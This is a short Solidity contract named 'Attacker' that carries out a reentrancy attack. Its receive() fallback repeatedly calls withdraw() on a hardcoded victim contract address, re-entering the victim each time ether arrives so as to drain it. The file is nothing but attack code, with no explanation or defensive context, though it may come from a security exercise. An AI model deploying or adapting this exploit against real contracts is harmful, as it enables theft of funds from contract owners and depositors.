// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Attacker { 
    address victim = 0xd770Af7EDA33f7Aef2e1F7f72852a66D4393328A;

    receive() external payable {
        (bool status, )  = victim.call(abi.encodeWithSignature("withdraw()"));
    }
}
